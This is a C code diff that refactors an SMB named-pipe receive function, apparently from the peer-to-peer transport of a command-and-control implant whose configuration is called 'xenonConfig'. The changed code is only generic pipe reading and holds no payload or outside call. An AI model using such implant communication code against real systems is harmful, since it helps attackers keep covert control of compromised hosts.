@@ -123,52 +123,20 @@ BOOL SmbRecieve(PBYTE* ppOutData, SIZE_T* pOutLen)
     DWORD Total       = 0;
     PVOID Buffer      = NULL;
 
-    if ( PeekNamedPipe( xenonConfig->SmbPipe, NULL, 0, NULL, &PackageSize, NULL ) )
+    if ( !xenonConfig->SmbPipe )    
     {
-        _dbg("PeekNamedPipe found: %d bytes", PackageSize);
-
-        if ( PackageSize > sizeof(TASK_UUID_SIZE))
-        {
-            /* Dynamically allocated to handle any size */
-            Buffer = LocalAlloc(LPTR, PackageSize);
-
-            /* Try to read the whole message */
-            do {
-                if ( !ReadFile(xenonConfig->SmbPipe, (Buffer + Total), MIN((PackageSize - Total), PIPE_BUFFER_MAX), &BytesRead, NULL) ) 
-                {
-                    if ( GetLastError() != ERROR_MORE_DATA ) 
-                    {
-                        _err("ReadFile failed with %d", GetLastError());
-                        LocalFree(Buffer);
-                        *ppOutData  = NULL;
-                        *pOutLen    = 0;
-                        return FALSE;
-                    }
-                }
-
-                Total += BytesRead;
-            } while ( Total < PackageSize );
-            
-            /* Output */
-            *ppOutData = Buffer;
-            *pOutLen = PackageSize;
-
-        }
-        else if ( PackageSize > 0 )
-        {
-            _err("Data in the pipe is too small: %d bytes", PackageSize);
-        }
-        else
-        {
-            // Nothing in the pipe
-        }
-    }
-    else
-    {
-        /* We disconnected */
-        _err("PeekNamedPipe failed with %d\n", GetLastError());
+        /* Means that the client disconnected/the pipe is closing. */
+        _dbg("SMB pipe not initialized!");
         return FALSE;
     }
+
+    if ( !PackageReadPipe(xenonConfig->SmbPipe, ppOutData, pOutLen) )
+    {
+        _err("Failed to read from pipe. ERROR : %d", GetLastError());
+        return FALSE;
+    }
+
+    _dbg("Read %d bytes from pipe", *pOutLen);
 
     return TRUE;
 }
